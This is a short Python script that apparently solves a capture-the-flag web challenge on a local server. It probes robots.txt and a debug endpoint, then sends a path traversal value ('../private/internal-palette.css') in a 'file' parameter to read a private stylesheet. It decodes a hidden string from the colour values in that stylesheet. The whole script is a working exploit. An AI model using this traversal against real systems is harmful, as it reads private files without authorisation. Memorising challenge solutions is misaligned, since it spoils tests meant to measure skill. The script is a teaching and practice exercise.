#!/usr/bin/env python3
import re
import sys
from urllib.parse import urlencode, urljoin
from urllib.request import Request, urlopen


def fetch(url):
    request = Request(url, headers={"User-Agent": "css-color-solver"})
    with urlopen(request, timeout=10) as response:
        return response.read().decode("utf-8", errors="replace")


def main():
    base_url = sys.argv[1].rstrip("/") + "/" if len(sys.argv) > 1 else "http://127.0.0.1:8082/"
    fetch(urljoin(base_url, "robots.txt"))
    fetch(urljoin(base_url, "debug/theme?name=internal"))

    payload = urlencode({"file": "../private/internal-palette.css"})
    css = fetch(urljoin(base_url, "theme") + "?" + payload)
    entries = re.findall(r"\.swatch-(\d+)\s*\{[^#]+#([0-9a-fA-F]{2})0000", css)
    if not entries:
        raise SystemExit("encoded colors not found")

    chars = []
    for _, hex_byte in sorted((int(i), b) for i, b in entries):
        chars.append(chr(int(hex_byte, 16)))
    print("".join(chars))


if __name__ == "__main__":
    main()
